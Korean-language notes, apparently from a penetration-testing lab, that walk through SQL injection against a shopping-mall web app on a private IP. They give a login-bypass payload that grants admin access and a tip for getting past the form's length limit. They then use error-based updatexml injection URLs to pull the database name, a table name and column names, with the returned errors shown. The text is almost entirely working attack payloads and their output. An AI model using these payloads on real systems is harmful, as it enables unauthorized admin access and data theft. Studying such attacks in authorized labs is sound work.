#### 로그인 폼 SQL Injection
```mysql
' OR '1'='1' # 
```

관리자 계정으로 로그인 성공
로그인 폼에 글자 수 제한 최대 15자 존재하는데, 브라우저의 개발자 도구(F12)를 활용해 html 소스를 열어 수정할 수 있음


#### 주소창에 오류 유도 
###### DB 이름 알아내기
```http
http://192.168.20.28/m_mall_detail.php?ps_ctid=01010000&ps_goid=41%27%20AND%20updatexml(1,concat(0x3a,database()),1)--+
```
db 이름을 확인 성공

```mysql
!!coreMall(MySQL DB ERROR)!!
XPATH syntax error: ':fsk_m_db'
Mysql Error Num : 1105
```

###### 테이블 이름 알아내기
```http
http://192.168.20.28/m_mall_detail.php?ps_ctid=01010000&ps_goid=41%27%20AND%20updatexml(1,concat(0x3a,(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)),1)--+
```

```mysql
!!coreMall(MySQL DB ERROR)!!
XPATH syntax error: ':morning_badmin_table'
Mysql Error Num : 1105
```

###### 컬럼 이름 알아내기
```http
http://192.168.20.28/m_mall_detail.php?ps_ctid=01010000&&ps_goid=41' AND updatexml(1,concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='morning_badmin_table' LIMIT 0,1)),1)--+
```

```mysql
!!coreMall(MySQL DB ERROR)!!
XPATH syntax error: ':uid'
Mysql Error Num : 1105
```
`LIMIT 0,1`의 숫자를 `1,1`, `2,1` 등으로 바꿔 가며 컬럼명을 모두 탐색
`board_name_code`, `board_total_access`, `board_total_record`, `board_skin`, `board_gohome`, `board_gohome_target`, `table_width`, `str_length`, `list_num`, `page_num`, `comment_num`, `browser_title`, `board_title`, `board_title_image`, `board_header_text`, `board_tailer_text`, `board_hlist_text`, `board_tlist_text`, `board_header_file`, 